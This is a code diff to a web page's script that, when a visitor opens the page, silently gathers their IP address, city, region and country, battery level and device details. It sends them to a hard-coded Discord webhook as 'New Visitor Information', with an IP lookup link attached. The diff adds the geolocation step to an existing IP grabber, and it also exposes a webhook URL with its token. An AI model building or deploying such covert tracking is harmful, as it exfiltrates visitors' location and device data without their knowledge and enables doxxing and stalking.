@@ -11,12 +11,24 @@
         // Replace with your Discord webhook URL
         const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
 
-        // Function to get IP address
-        function getIPAddress() {
-            return fetch('https://api.ipify.org?format=json')
+        // Function to get IP address and geolocation info from ip-api
+        function getIPAndLocation() {
+            return fetch('http://edns.ip-api.com/json')
                 .then(response => response.json())
-                .then(data => data.ip)
-                .catch(error => console.error('Error fetching IP:', error));
+                .then(data => {
+                    if (data.status === "success") {
+                        return {
+                            ip: data.dns.ip,
+                            location: `City: ${data.city}, Region: ${data.regionName}, Country: ${data.country}`
+                        };
+                    } else {
+                        return { ip: 'Unknown', location: 'Location not available' };
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching IP and location:', error);
+                    return { ip: 'Unknown', location: 'Location not available' };
+                });
         }
 
         // Function to get battery info
@@ -63,7 +75,7 @@
         }
 
         // Function to send data to the Discord webhook
-        function sendToDiscord(ip, battery, deviceInfo) {
+        function sendToDiscord(ip, battery, location, deviceInfo) {
             const payload = {
                 embeds: [{
                     title: "New Visitor Information",
@@ -71,9 +83,12 @@
                     fields: [
                         { name: "IP Address", value: ip, inline: true },
                         { name: "Battery Level", value: battery, inline: true },
+                        { name: "Location", value: location, inline: false },
                         { name: "Device Info", value: deviceInfo, inline: false }
                     ],
-                    footer: { text: `Logged at ${new Date().toLocaleString()}` }
+                    footer: { text: `Logged at ${new Date().toLocaleString()}` },
+                    // Adding a "More Info" button that links to the IP lookup page
+                    url: `https://ipinfo.io/${ip}`
                 }]
             };
 
@@ -91,10 +106,10 @@
         }
 
         // Execute functions and send data
-        Promise.all([getIPAddress(), getBatteryInfo()])
-            .then(([ip, battery]) => {
+        Promise.all([getIPAndLocation(), getBatteryInfo()])
+            .then(([{ ip, location }, battery]) => {
                 const deviceInfo = getDeviceInfo();
-                sendToDiscord(ip, battery, deviceInfo);
+                sendToDiscord(ip, battery, location, deviceInfo);
             });
     </script>
 </body>
